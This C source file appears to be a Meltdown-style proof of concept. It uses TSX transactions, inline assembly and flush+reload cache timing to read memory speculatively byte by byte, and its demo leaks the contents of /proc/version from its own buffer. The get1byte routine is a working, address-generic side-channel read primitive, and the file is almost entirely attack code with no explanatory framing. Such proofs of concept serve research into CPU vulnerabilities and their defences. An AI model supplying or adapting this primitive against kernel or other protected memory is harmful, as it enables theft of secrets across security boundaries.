#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include "meltlib.h"

unsigned char get1byte(size_t ptr, char* buf, int page_size)
{
  int c, i, status = 0, min_idx = 0, victim = 0;
  unsigned long times[256]; // store the time.
  unsigned int tests[256]; // count the number of times when this page is the fastest.
  unsigned long long t1 = 0;
   
  memset(tests, 0, sizeof(tests));
   
  for (c = 0; c < 16; c++) {
    memset(times, 0, sizeof(unsigned long) * 256);
      
    for (i=0; i<256; i++) {
      flush(&buf[i * page_size]);
    }
   
    if ((status = _xbegin()) == _XBEGIN_STARTED) {
      asm __volatile__ (
        "%=:                              \n"
        "xorq %%rax, %%rax                \n"
        "movb (%[ptr]), %%al              \n"
        "shlq $0xc, %%rax                 \n"
        "jz %=b                           \n"
        "movq (%[buf], %%rax, 1), %%rbx   \n"
        : 
        :  [ptr] "r" (ptr), [buf] "r" (buf)
        :  "%rax", "%rbx");
      
      _xend();
    } else {
       asm __volatile__ ("mfence\n" :::);
    }

    for (i=0; i<256; i++) {
      times[i] = measure_time(&buf[i * page_size]);
    }// measure the time.
   
    for (i=0; i<256; i++) {
      min_idx = (times[min_idx] > times[i]) ? i : min_idx;
    }
      
    tests[min_idx]++;
  }
   
  for (i=0; i<256; i++) {
    victim = (tests[i] > tests[victim]) ? i : victim;
  }
   
  return (unsigned char)victim;
}

int main(int argc, char** argv)
{
  unsigned char read_buf[17] = {0};
  int page_size = getpagesize();
  unsigned long t, len = 0;

  FILE *fp = fopen("/proc/version", "r");

  static char secret[128];
  memset(secret, 0, sizeof(secret));
  fgets(secret, 128, fp);

  unsigned long start_addr = (unsigned long)secret;
  len = strlen(secret);

   
  char* poke = (char*)mmap(NULL, 256 * page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0);
      
  if (poke == MAP_FAILED) {
    printf("mmap() failed: %s\n", strerror(errno));
    return -1;
  }
      
  printf ("poke buffer: %p, page size: %i\n", poke, page_size);
   
  for (t=0; t<len; t++) {
    if (t > 0 && t % 16 == 0) {
      printf("%s", read_buf);
      memset(read_buf, 0, sizeof(read_buf));
    }
      
    read_buf[t%16] = get1byte(start_addr + t, poke, page_size);
  }
   
  if (t > 0) {
    printf("%s\n", read_buf);
  }
  munmap((void*)poke, 256 * page_size);
}
